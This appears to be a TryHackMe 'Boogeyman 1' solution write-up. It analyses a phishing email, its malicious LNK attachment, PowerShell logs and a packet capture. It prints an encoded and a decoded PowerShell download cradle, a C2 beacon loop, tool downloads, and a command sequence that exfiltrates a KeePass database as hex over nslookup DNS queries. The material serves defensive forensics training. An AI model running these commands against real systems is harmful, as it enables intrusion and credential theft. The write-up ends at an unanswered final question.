# [TryHackMe | Boogeyman 1](https://tryhackme.com/room/boogeyman1) Challenge Room Solution Writeup

## [Task 2 | [Email Analysis] Look at that Headers!](https://tryhackme.com/room/boogeyman1?taskNo=2)

Open `dump.eml` in `Thunderbird` and view the source.

```http
Received: from KL1PR06MB6210.apcprd06.prod.outlook.com (2603:1096:820:d9::9)
 by TY2PR06MB2911.apcprd06.prod.outlook.com with HTTPS; Fri, 13 Jan 2023
 09:25:35 +0000
Received: from BN9PR03CA0626.namprd03.prod.outlook.com (2603:10b6:408:106::31)
 by KL1PR06MB6210.apcprd06.prod.outlook.com (2603:1096:820:d9::9) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.6002.9; Fri, 13 Jan
 2023 09:25:33 +0000
Received: from BN8NAM04FT033.eop-NAM04.prod.protection.outlook.com
 (2603:10b6:408:106:cafe::55) by BN9PR03CA0626.outlook.office365.com
 (2603:10b6:408:106::31) with Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.6002.13 via Frontend
 Transport; Fri, 13 Jan 2023 09:25:31 +0000
Authentication-Results: spf=pass (sender IP is 15.235.99.80)
 smtp.mailfrom=bpakcaging.xyz; dkim=pass (signature was verified)
 header.d=bpakcaging.xyz;dmarc=bestguesspass action=none
 header.from=bpakcaging.xyz;compauth=pass reason=109
Received-SPF: Pass (protection.outlook.com: domain of bpakcaging.xyz
 designates 15.235.99.80 as permitted sender) receiver=protection.outlook.com;
 client-ip=15.235.99.80; helo=pa80.mxout.mta1.net; pr=C
Received: from pa80.mxout.mta1.net (15.235.99.80) by
 BN8NAM04FT033.mail.protection.outlook.com (10.13.161.53) with Microsoft SMTP
 Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.20.6002.13 via Frontend Transport; Fri, 13 Jan 2023 09:25:31 +0000
X-IncomingTopHeaderMarker:
 OriginalChecksum:B9E13D81CB0879339479CFF31A9D1BAC391FB1268EBA2DF1CD65E467A897D382;UpperCasedChecksum:607CA57AA5DFCDF80738AC3D7B95092AC0EED4788B0074646B818607350E6192;SizeAsReceived:1595;Count:13
DKIM-Signature: v=1; a=rsa-sha256; d=bpakcaging.xyz; s=api; c=relaxed/simple;
	t=1673601926; h=from:date:subject:reply-to:to:list-unsubscribe:mime-version;
	bh=DORzQK4K9VXO5g47mYpyX7cPagIyvAX1RLfbY0szvCc=;
	b=dCB9MhhsZqg4h2P9dg5zMjLj7HVS9vt0fXuqEzH8cj6ft+YBJxvZHkF8uc+CeOas6CoICaPu13Q
	oL/xVebg3aO8bmlooJWTAZx7mmrh/1ZQBVHm3wvGVI9Xn55nhWzRGoqVOAAPPM6+MEHFwZDIjKDAs
	RpDurrnykQeCXCp127k=
DKIM-Signature: v=1; a=rsa-sha256; d=elasticemail.com; s=api;
	c=relaxed/simple; t=1673601926;
	h=from:date:subject:reply-to:to:list-unsubscribe;
	bh=DORzQK4K9VXO5g47mYpyX7cPagIyvAX1RLfbY0szvCc=;
	b=jcC3z+U5lVQUJEYRyQ76Z+xaJMrXN2YdjyM8pUl7hgXesQaY7rqSORNRWynpDQ3/CBSllw31eDq
	WmoqpFqj2uVy5RXK73lkBEHs5ju1eH/4svHpZLS9+wU/tO5dfZVUImvY32iinpJCtoiMLjdpKYMA/
	d5BBGqluALtqy9fZQzM=
From: Arthur Griffin <agriffin@bpakcaging.xyz>
Date: Fri, 13 Jan 2023 09:25:26 +0000
Subject: Collection for Quick Logistics LLC - Jan 2023
Message-Id: <4uiwqc5wd1qx.HPk2p-JE_jYbkWIRB-SmuA2@tracking.bpakcaging.xyz>
Reply-To: Arthur Griffin <agriffin@bpakcaging.xyz>
Sender: agriffin@bpakcaging.xyz
To: Julianne Westcott <julianne.westcott@hotmail.com>
List-Unsubscribe:
 =?us-ascii?q?=3Cmailto=3Aunsubscribe+HPk2p-JE=5FjYbkWIRB-SmuA2=40bounces=2Eelasticem?=
 =?us-ascii?q?ail=2Enet=3Fsubject=3Dunsubscribe=3E=2C?=
 =?us-ascii?q?_=3Chttp=3A=2F=2Ftracking=2Ebpakcaging=2Exyz=2Ftracking=2Funsubscribe=3Fmsgid=3DHP?=
 =?us-ascii?q?k2p-JE=5FjYbkWIRB-SmuA2&c=3D0=3E?=
X-Msg-EID: HPk2p-JE_jYbkWIRB-SmuA2
Content-Type: multipart/mixed;
	boundary="=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKyw=="
X-IncomingHeaderCount: 13
Return-Path: agriffin@bpakcaging.xyz
X-MS-Exchange-Organization-ExpirationStartTime: 13 Jan 2023 09:25:31.7663
 (UTC)
X-MS-Exchange-Organization-ExpirationStartTimeReason: OriginalSubmit
X-MS-Exchange-Organization-ExpirationInterval: 1:00:00:00.0000000
X-MS-Exchange-Organization-ExpirationIntervalReason: OriginalSubmit
X-MS-Exchange-Organization-Network-Message-Id:
 7a3fe4a6-6d9a-42ef-a89c-08daf5481e17
X-EOPAttributedMessage: 0
X-EOPTenantAttributedMessage: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa:0
X-MS-Exchange-Organization-MessageDirectionality: Incoming
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: BN8NAM04FT033:EE_|KL1PR06MB6210:EE_
X-MS-Exchange-Organization-AuthSource:
 BN8NAM04FT033.eop-NAM04.prod.protection.outlook.com
X-MS-Exchange-Organization-AuthAs: Anonymous
X-MS-UserLastLogonTime: 1/13/2023 9:25:32 AM
X-MS-Office365-Filtering-Correlation-Id: 7a3fe4a6-6d9a-42ef-a89c-08daf5481e17
X-MS-Exchange-EOPDirect: true
X-Sender-IP: 15.235.99.80
X-SID-PRA: AGRIFFIN@BPAKCAGING.XYZ
X-SID-Result: PASS
X-MS-Exchange-Organization-PCL: 2
X-MS-Exchange-Organization-SCL: 5
X-Microsoft-Antispam: BCL:0;
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 13 Jan 2023 09:25:31.6882
 (UTC)
X-MS-Exchange-CrossTenant-Network-Message-Id: 7a3fe4a6-6d9a-42ef-a89c-08daf5481e17
X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
X-MS-Exchange-CrossTenant-AuthSource:
 BN8NAM04FT033.eop-NAM04.prod.protection.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Anonymous
X-MS-Exchange-CrossTenant-FromEntityHeader: Internet
X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg:
 00000000-0000-0000-0000-000000000000
X-MS-Exchange-Transport-CrossTenantHeadersStamped: KL1PR06MB6210
X-MS-Exchange-Transport-EndToEndLatency: 00:00:04.0336339
X-MS-Exchange-Processed-By-BccFoldering: 15.20.6002.013
X-Microsoft-Antispam-Mailbox-Delivery:
	abwl:0;wl:1;pcwl:1;kl:0;dwl:0;dkl:0;rwl:0;ucf:0;jmr:0;ex:0;auth:1;dest:I;OFR:TrustedSenderList;ENG:(5062000305)(90000117)(91040095)(5061607266)(5061608174)(9050020)(9060121)(9100338)(2008001134)(4810004)(4910033)(8820095)(10005027)(9930004)(9610025)(9540006)(10160021)(9439006)(9310011)(9220031);
X-Message-Info:
	qZelhIiYnPlNyd1OgziR7PqHsQq4ZRpNilQNp6GRZx824bO/p1N0uTJoPSZmA77Un/3eDpWW+MwepB7uCCgLNb1FeD75MsLFumfIGzl2cUp7ZdsO/8YtRPalxvDhRGDA30n7uIyMFCxOqwqVBbeiuaa4Ex00yhLWPUL2oVhdtvkckjb//bmj5FyrlXvg7JZps/Zua4Bh2i67KodJgs+tDg==
X-Message-Delivery: Vj0xLjE7dXM9MDtsPTA7YT0wO0Q9MTtHRD0yO1NDTD0tMQ==
X-Microsoft-Antispam-Message-Info:
	=?utf-8?B?d3pNMUs5cnJiQkJCcDh3amlaWEJFYWxBbWpOelBGY3hMNjFmUC9RWk9iZ1o2?=
 =?utf-8?B?ZmxJcTlydlJ1aEhDVS9QbWlaTXR5c21nbldJOUtCK1hnQmM0anYza3RjVjU0?=
 =?utf-8?B?V3IxNGRBdTFDQTdTbzArWXJLOE9iR3dDSnFWL042WjZMRDQ1MkJkbVdVTWE0?=
 =?utf-8?B?ZVdGMHZQelhRWUFKM0JEYXNLV01Sdis2RXZ3M0VlU2Fnd1RjRjMzL3F4ZEFs?=
 =?utf-8?B?ZnQ2T0xBRTNHdXdIQWpkMXg3TEx5Nk1GU1lpNWNDNmRJWDNpS0hPOTc1T2V4?=
 =?utf-8?B?Y0xTejkyckNIY1doSFNIc1FSay9PL1RodU5iSk1EcG9wWlJXby9hZjljdnBD?=
 =?utf-8?B?N29qOFlOa2dCamN3QVlKU3FRY29HaTd2amFtQmRRUWlIYktFOGF1M2twNFJB?=
 =?utf-8?B?bzUzcE03ckZRdXZYdjM0S2wrWUhpYXFmTWdPRzFIQXNzQm1qaW5ndzBJb2NK?=
 =?utf-8?B?eEc5WEdWZ1dDMW9QUEs2N0F6U2FNUnQxb0FBbVNZcHUva1o5TmZHNGVnS0g1?=
 =?utf-8?B?cG4xSTlSSFRkaG9adVJrMGNxUkRiblRDelRIN0VjVFV3cHpzcUIvQ2ZxRzJy?=
 =?utf-8?B?MjAzaFJkYllobVh1MEdLRndRcFR3cXR1L0tTdXZ5YnZsdWNOcHlyMWFza1lZ?=
 =?utf-8?B?bW1IcFBDK21EV3JsMm9mM0piNW1pWjd1UWx0QytkL0dzOWxtRTZGMXNOZU5B?=
 =?utf-8?B?Vnh1T0FDMlI1SU5jL09Qd1BFMHNEOTVKcTQ5Tk50VGRESXRkaWEyYUhRL3NP?=
 =?utf-8?B?VCtWcmowRkN4VEdhbjlaK1RRTGN1VjNiMEtjRkdVY040SXNxU3N2QURnbTBw?=
 =?utf-8?B?QXdIaTRLS2pNellrNHpGVjVHZWFqdm9sS2ljZzk2KzRKYkI2V0FFNXpVWEh0?=
 =?utf-8?B?MXQzTGdKUnpZRzlmb0R1VDhnSlhBZFZ2eWZ1SE95NlVxWWw4OHhVYitkT2g3?=
 =?utf-8?B?Ti9Tbno0R1JGNFh0bHFyUllIM1JWMUFqcHVGNEVkVTN5ZHNxazA2TDFiNzJn?=
 =?utf-8?B?cml1REdXQU1MVTJqSElZWVNIM0dhdTZ3aWFZczlWTHNNeGZPZm0zb0RRVHQ4?=
 =?utf-8?B?MERQOG9ZYXdLR09BSWNlYVR1UmlhRzRab29UcDE1UnljcHBDZHRUSHgxcjRK?=
 =?utf-8?B?aCswbm9iVHlpVEVjZVVQUmdzSytFanRFcUJONkdSMzZJangvMEFHcjF1NXBY?=
 =?utf-8?B?eWxRV2FiYVZ3UXN3ZXVZWTlGVEhWQmZNMkxVL3RidnV2UmVxVWMrV05XNkQ5?=
 =?utf-8?B?QzM1MUFDeHI5bGc4UGRnQWRyL2E1dkJLR29BMXdYaStFa2QraGxqSSs4OVI1?=
 =?utf-8?B?OFdOL2VhRU5abGE1S0k1ZURBajFmQzE0U3pTenEzbmVIVFpKdml1TzZUNWFs?=
 =?utf-8?B?RUsxNHdsNXY0bUVPVW9DSEdLTnBJNGVzKzY0ckxDY3BCaGlSMHY3cWR6bkpT?=
 =?utf-8?B?WVo2aTNEa2EvOHRzek1lL05Vd0RSaWRJTTNZbWV4RnE3aEdvOEptbjB1M3Ev?=
 =?utf-8?B?THFjQW94NnhYQVRad1VVSC8zMENCcWNaTTJWSkhUWGJscHZuMnFseVczd0xa?=
 =?utf-8?B?d0JyVDV6WGpnVVpGVDd3WHJIajdVSUdKdysxQUkyZXBRbnpUUUJ3T0RhcmhX?=
 =?utf-8?B?SUIvUVVwT3M2RU83OWRxMmdiNU1wNUVYVDBkb21pOTNNRGNoWmNyTXUrNVdl?=
 =?utf-8?B?TThGRlVJdXlWeHF0aVlBMVBoZFRXZ0ovMWVpMkMxV2lCellKREkwY041d3Nu?=
 =?utf-8?B?Z2FEM3IwTUllaTYrUEQ4cEVmMWNEajVPVit6aGI5S1VSOGdnMmRhNlQ4K1dI?=
 =?utf-8?B?OFk5QkRZY09HTWF0dGxMMFZJL1Z0bnpaZTBCWlZBb1NqK2hNOUFNamNwOWVi?=
 =?utf-8?B?cUJLaGxRVzBTK0g4bEdta3JTQjRQRFU0WkdoeVcvOXp5MXBQZy9kdHIwTUoy?=
 =?utf-8?B?VWZQbDRybzBjcmRYYS9SVlNGMm5Mc2NBTU1wWVFXOXdFN2VUODZSWjZiSlY5?=
 =?utf-8?B?cGRQa2FQcFgwWE9XTHJ1NTllRE40RVpSSFpJaWlmaHhVYmo5UXJOTHE0WTNQ?=
 =?utf-8?B?MmJtMVBrb1FHeW9CNGtkMnBsVXRBWjREM1FDaUdpRUZndDF4eXYwOHoxTXFH?=
 =?utf-8?B?QmowRUFaYTh2VVhDdHhFa2ZnQ2VRczQ3di91UUIyN3lWSnBXUk9UNXVMS0cz?=
 =?utf-8?B?UGozazZGcnZucnV6YTNNQlhqakNSN25KZGVWYVBBaHowY1l0MWVvdlNja25z?=
 =?utf-8?B?dnU4R0RlTDNoaVJaSUZDdU85QmZDSi9oMjVxTkcvcnBJR1lmSkJrK3VneXV1?=
 =?utf-8?B?K1RXcFJMME9QSDZScUdLNVpaWkhtTXNIT3ZvbVRzRkpocVZidC90dEFma2NM?=
 =?utf-8?B?Uk5HMzlaVVZubXdUc0ZEdG95bzdZL3JLSnpWTnVqWHRVN28yeGtBeEFmVjJB?=
 =?utf-8?B?WlQ5b1RSa1dHUmtoTzZVeTZsS3NoRW1aOS9yOU1IS0srK2RaWUxobHE2M0Jy?=
 =?utf-8?B?UDZWQUdWREJJYzJ6Ujg3cVhsZnpmWURjci95ZUUvMUFtS0lZbHViMmorRy84?=
 =?utf-8?B?T0RqOXJ6WDhoS3NPbVZ3bXRNWnpXcllBV05FZCtZMmJlcmI0Mm1zdlJQdkpB?=
 =?utf-8?B?NVhLMXMwdDlKNWE0TDhxR2pSQURDN1VMdWJJQU9Ic3pSbEVXKzJTY1FHNEFv?=
 =?utf-8?B?S1R3VXZKSjFhbk1iQlV4V3NxT01IVjNpS0w4SkY0TDY4bnhPUW53VDVTdldY?=
 =?utf-8?B?aHQ3U0ZIZzhRSEpFRllLSEpyZk9xV080OEY5OS9tdFRVdFpaelhFcWpiOVBO?=
 =?utf-8?B?TS9ZRFhBeS80K2xLTHNZVTR6UW1peXBRQ1dzSkF4cGtNSkpoVVF3TTROcWRx?=
 =?utf-8?B?ejZmSEhRODZUYWRvRzhZSyt6QT09?=
MIME-Version: 1.0

--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKyw==
Content-Type: multipart/alternative;
	boundary="=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKzQ=="

--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKzQ==
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable


Hi Julianne,

I hope you are well.

I just wanted to drop you a quick note to remind you in respect of doc=
ument #39586972 is due for payment on January 20, 2023.

I would be grateful if you could confirm everything is on track for pa=
yment.

For additional information, kindly see the attached document.

You may use this code to view the encrypted file: Invoice2023!


Best regards,
Arthur Griffin
Collections Officer
B Packaging Inc.

E: agriffin@bpackaging.xyz
W: http://tracking.bpakcaging.xyz/tracking/click?d=3DURMWrjI0OT2vNPUjG=
Un3OZ3jpeKRtRwemj2AZ6Bm1SIUCt-NdD3Lf9RozGOna5hzVa2b7mlq2uPqWZ-ulX3RVQQ=
D1HPcDMn6WjYqv7d10NcZbam10x7BmNl_hKSmy0GP9w2
http://tracking.bpakcaging.xyz/tracking/unsubscribe?d=3DHgbeKaSL-7al2K=
ewtOSPNa1ficRJPV33ZIpO5ezJtLh4oUgXsQInRMJ36_CuhPXx_b_05wsIcNuKFlnAe7bI=
RrputdJtEn0Ju6VveHpeDxxd0
--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKzQ==
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: quoted-printable

<html>
<head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-8"></=
head>
<body style=3D"font-size: 13px; font-family: Helvetica;">
<br>
<p>Hi Julianne,</p>

<p>I hope you are well.</p>

<p>I just wanted to drop you a quick note to remind you in respect of docum=
ent #39586972 is due for payment on January 20, 2023.</p>

<p>I would be grateful if you could confirm everything is on track for paym=
ent.</p>

<p>For additional information, kindly see the attached document.<br><br>
You may use this code to view the encrypted file: <strong>Invoice2023!</str=
ong></p>


<p>Best regards,<br>
<strong>Arthur Griffin</strong><br>
Collections Officer<br>
B Packaging Inc.<br><br>

E: agriffin@bpackaging.xyz<br>
W: https://bpackaging.xyz</p>
<img src=3D"http://tracking.bpakcaging.xyz/tracking/open?msgid=3DHPk2p-JE_j=
YbkWIRB-SmuA2&amp;c=3D0" style=3D"width:1px;height:1px" alt=3D""><div style=
=3D"text-align:center; background-color:#fff;padding-top:10px;padding-botto=
m:10px;font-size:8pt;font-family:sans-serif;"><a href=3D"http://tracking.bp=
akcaging.xyz/tracking/unsubscribe?d=3DHgbeKaSL-7al2KewtOSPNa1ficRJPV33ZIpO5=
ezJtLh4oUgXsQInRMJ36_CuhPXx_b_05wsIcNuKFlnAe7bIRrputdJtEn0Ju6VveHpeDxxd0" s=
tyle=3D"text-align:center;text-decoration:none;color:#666;">UNSUBSCRIBE</a>=
</div></body>
</html>=

--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKzQ==--

--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKyw==
Content-Type: application/zip
Content-Disposition: attachment; filename="Invoice.zip"; size=908;
Content-Transfer-Encoding: base64

UEsDBBQAAQAIAGiGLVZRFQDJ3gIAACgJAAAUAAAASW52b2ljZV8yMDIzMDEwMy5sbmvuhS6/jU+4
ClhWAZwY+LBcOUvw6oMIq5WNiZwjlKXvAj+pMMBFROiABqlJBxngGOoWUKX0yBXsXOhYPq3Z+Zls
vZX0xZqtZ/KWnX/QpZXzW44KZz1eqH+hnLgKXPTBsyTSqpqK9QUvYEsltPMSYnL0IqSNwX2TuL9l
oB0QB3owNKK2cltANxR5Nt3pdYwKJ4BqqI4x7D/ze4bWBT1jlR4HW8VEByEyLoc2fw3I0r0bc/8J
v9g1SZPBvshBg0pxI0/89GR2agMP+Lv6smkO/huUEOSRpidp/ft+prkt5v9sHFyS/Q0CTb9njCi2
terQ9NTeFAOkNAhGxWUPqPwPzB0cS+GBC2JY3LMqlA0K5aTejRodyVPcLlq2KVbyF7XljH2NZA4T
bFsDNJMFk2fQB1hfvmseP9FA20VAfwYvYW8GnBDdqhJtAwJ5xNvJgFFK/MTY2fChwTNN2zszqhzn
v1Sx+71+duA41HGR9K/jh4nEeRgPslOVlGtLwKBikbIpx/5ZaLpiZYwKS177jDoh3Qx+FRxsM6Ue
hjPSNgKmWHFZjReDWx8KD7qGLL9acO0hvZUuH83b70sAREDJbw+4sC2jcYO+hrHys6E4Dml030WQ
WhkKpvYv4DUw9nDmkGg4YgnyAv/iMbtImSUZQ/Wc6dEJM213hYefp8DTQZ321fZU5iCk86bAdxX2
3Ov40S9eX78X7CSp9b0QKNeC+N3JgMJ/gQrCWC73UfmHjT4mkBoP8A4YktR2LFNeistVP/zeMQPS
qUs8KaI7q+VTu/9buNeWkEW2maDm+bC0Q4AnJL+AocgZDPJ0RzfLWEpff3nbaYb6aPqhLTBfFURi
dszLIMEKmDLmiVqkWZJly9qV26NFttz5y4Q+fAATd6tMYRDlu/BFCo4+rdxjiKl0Gnn7UBHCq0gy
eEv/L8bppKI09XqNV3MJxMLBE3RN7E080hVp07qDpNpQTYEFa08gGy6yYFBLAQI/ABQAAQAIAGiG
LVZRFQDJ3gIAACgJAAAUACQAAAAAAAAAIAAAAAAAAABJbnZvaWNlXzIwMjMwMTAzLmxuawoAIAAA
AAAAAQAYAGiPRUBvJ9kBAAAAAAAAAAAAAAAAAAAAAFBLBQYAAAAAAQABAGYAAAAQAwAAAAA=

--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKyw==--
```

### What is the email address used to send the phishing email?

Inspect the above source to find `From: Arthur Griffin <`**agriffin@bpakcaging[.]xyz**`>`.

### What is the email address of the victim?

Inspect the above source to find `To: Julianne Westcott <`**julianne[.]westcott@hotmail[.]com**`>`.

### What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

Inspect the above source to find `DKIM-Signature: v=1; a=rsa-sha256; d=`**elasticemail**`.com; ...`.

### What is the name of the file inside the encrypted attachment?

Use the `terminal` and `unzip` to list the zipped file(s).

```bash
unzip -l Invoice.zip 

Archive:  Invoice.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     2344  2023-01-13 16:51   Invoice_20230103.lnk
---------                     -------
     2344                     1 file
```

The name is **Invoice_20230103.lnk**.

### What is the password of the encrypted attachment?

Inspect the above source to find `You may use this code to view the encrypted file: `**Invoice2023!**.

### Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

Use the `terminal` to run `unzip -P Invoice2023! Invoice.zip` then `lnkparse Invoice_20230103.lnk`.

```yaml
Windows Shortcut Information:
   Link CLSID: 00021401-0000-0000-C000-000000000046
   Link Flags: HasTargetIDList | HasName | HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation | IsUnicode | HasExpIcon - (16637)
   File Flags:  - (0)

   Creation Timestamp: None
   Modified Timestamp: None
   Accessed Timestamp: None

   Icon Index: 0 
   Window Style: SW_SHOWMINNOACTIVE 
   HotKey: CONTROL - C {0x4302} 

   TARGETS:
      Index: 78
      ITEMS:
         Root Folder
            Sort index: My Computer
            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
         Volume Item
            Flags: 0xf
            Data: None
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: Windows
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: System32
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: WindowsPowerShell
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: v1.0
         File entry
            Flags: Is file
            Modification time: None
            File attribute flags: 0
            Primary name: powershell.exe

   DATA
      Description: Invoice Jan 2023
      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      Working directory: C:
      Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
      Icon location: C:\Users\Administrator\Desktop\excel.ico

   EXTRA BLOCKS:
      ICON_LOCATION_BLOCK
         Target ansi: %USERPROFILE%\Desktop\excel.ico
         Target unicode: %USERPROFILE%\Desktop\excel.ico
      SPECIAL_FOLDER_LOCATION_BLOCK
         Special folder id: 37
      KNOWN_FOLDER_LOCATION_BLOCK
         Known folder id: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7
      METADATA_PROPERTIES_BLOCK
         Version: 0x53505331
         Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE
```

The encoded payload is `Command line arguments: -nop -windowstyle hidden -enc `**aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA**`==`. This decodes as Base64 > UTF-16LE (1200) > `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')`.

## [Task 3 | [Endpoint Security] Are You Sure That's an Invoice?](https://tryhackme.com/room/boogeyman1?taskNo=3)

List only timestamp-sorted attacker commands logged in `powershell.json`, filtering out `null` and internal `powershell` script blocks that aren't relevant.

```bash
cat powershell.json | jq 'select(.ScriptBlockText != null and (.ScriptBlockText | contains("Set-StrictMode -Version 1") | not))' | jq -s -c 'sort_by(.Timestamp) | .[] | .ScriptBlockText'

"iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')"
"$s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{\"X-38d2-8f49\"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{\"X-38d2-8f49\"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{\"X-38d2-8f49\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}\n"
"echo `r;pwd"
"whoami;pwd"
"cd C:\\;pwd"
"ls;pwd"
"cd Users;pwd"
"cd j.westcott;pwd"
"ps;pwd"
"iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd"
"cd Public;pwd"
"cd Music;pwd"
"iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe;pwd"
".\\sb.exe all;pwd"
".\\sb.exe system;pwd"
".\\sb.exe;pwd"
".\\sb.exe -group=all;pwd"
"Seatbelt.exe -group=user;pwd"
".\\sb.exe -group=user;pwd"
"ls C:\\Users\\j.westcott\\Documents\\protected_data.kdbx;pwd"
"cd ..\\AppData;pwd"
"ls Local;pwd"
"ls Local\\Packages;pwd"
"cd ..;pwd"
"ls AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe;pwd"
"ls AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState;pwd"
"iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd"
".\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\;pwd"
".\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite \"SELECT * from NOTE limit 100\";pwd"
"cd Documents;pwd"
"$file='protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd"
"split-path $pwd'\\0x00';pwd"
"$file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; $destination = \"167.71.211.113\"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd"
"$hex = ($bytes|ForEach-Object ToString X2) -join '';;pwd"
"$split = $hex -split '(\\S{50})'; ForEach ($line in $split) { nslookup -q=A \"$line.bpakcaging.xyz\" $destination;} echo \"Done\";;pwd"
```

### What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)

From the previously decoded payload, the domain is `bpakcaging.xyz`. Search through the listed attacker commands to find subdomains **cdn.bpakcaging.xyz,files.bpakcaging.xyz**.

### What is the name of the enumeration tool downloaded by the attacker?

The discovered [GitHub](https://github.com/S3cur3Th1sSh1t/PowerSharpPack) download references another [GitHub](https://github.com/GhostPack/Seatbelt), where remote enumeration is listed as one of the functionalities of **seatbelt**. This tool is later executed.

### What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.

`sq3.exe` was executed in the line `.\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite \"SELECT * from NOTE limit 100\";pwd` but this is not the full directory path. To reconstruct this, follow the `cd` sequence. Doing so reconstructs the path as **C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite**.

### What is the software that uses the file in Q3?

Based on the path in the previous question, it is **Microsoft Sticky Notes**.

### What is the name of the exfiltrated file?

Search through the listed attacker commands to find **protected_data.kdbx**.

### What type of file uses the .kdbx file extension?

This is a KDBX (KeePass DataBase) file, which is used to store sensitive user data and is processed in managers like **keepass**.

### What is the encoding used during the exfiltration attempt of the sensitive file?

Search through the listed attacker commands to find **hex** encoding.

### What is the tool used for exfiltration?

Search through the listed attacker commands to find **nslookup** being used.

## [Task 4 | [Network Traffic Analysis] They Got Us. Call the Bank Immediately!](https://tryhackme.com/room/boogeyman1?taskNo=4)

### What software is used by the attacker to host its presumed file/payload server?

Open `capture.pcapng` in `WireShark` then make the query `http.host contains files.bpakcaging.xyz`. Locate the packet containing `GET /sb.exe HTTP/1.1` or `GET /sq3.exe HTTP/1.1` and follow its TCP stream to find `Server: SimpleHTTP/0.6 `**Python**`/3.10.7`.

### What HTTP method is used by the C2 for the output of the commands executed by the attacker?

Query `http.host contains cdn.bpakcaging.xyz` and notice that **POST** requests contain encoded command output. 

### What is the protocol used during the exfiltration activity?

`nslookup` uses **DNS**.

### What is the password of the exfiltrated file?

